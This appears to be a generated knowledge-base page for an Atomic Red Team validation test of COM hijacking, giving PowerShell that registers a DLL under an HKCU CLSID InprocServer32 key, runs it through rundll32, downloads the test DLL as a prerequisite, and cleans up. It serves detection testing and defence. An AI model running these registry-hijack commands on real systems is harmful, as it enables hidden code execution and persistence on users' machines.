---
atomic_guid: "48117158-d7be-441b-bc6a-d9e36e47b52b"
title: "COM Hijacking - InprocServer32"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.015"
attack_technique_name: "Event Triggered Execution: Component Object Model Hijacking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "48117158-d7be-441b-bc6a-d9e36e47b52b"
  - "COM Hijacking - InprocServer32"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# COM Hijacking - InprocServer32

This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.

Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/

## Metadata

- Atomic GUID: 48117158-d7be-441b-bc6a-d9e36e47b52b
- Technique: T1546.015: Event Triggered Execution: Component Object Model Hijacking
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1546.015/T1546.015.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.015]]

## Input Arguments

### clsid

- description: Class ID to hijack.
- type: string
- default: {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}

### clsid_description

- description: Description for CLSID
- type: string
- default: MSAA AccPropServices

### clsid_threading

- description: Threading Model
- type: string
- default: Apartment

### dllpath

- description: Path to the DLL.
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll

## Dependencies

DLL For testing

### Prerequisite Check

```powershell
if (Test-Path "#{dllpath}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
```

## Executor

- name: powershell

### Command

```powershell
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dllpath}"
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
```

### Cleanup

```powershell
Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.yaml)
